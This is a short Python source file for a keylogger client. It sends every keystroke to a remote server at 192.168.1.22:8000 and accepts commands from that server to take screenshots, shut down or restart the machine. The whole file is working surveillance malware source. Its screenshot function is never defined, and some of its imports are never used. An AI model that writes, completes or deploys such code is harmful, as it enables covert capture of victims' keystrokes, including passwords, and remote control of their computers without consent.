from pynput.keyboard import Listener
import socket
import imutils
import pyautogui
from datetime import datetime
import os

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serverParent = '192.168.1.22'
serverPort = 8000
clientSocket.connect((serverParent, serverPort))

def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

# Start keylogger immediately upon connection
with Listener(on_press=on_press) as parent:
    try:
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            if message == 'screenshots':
                takeScreenshot()
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")
    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()
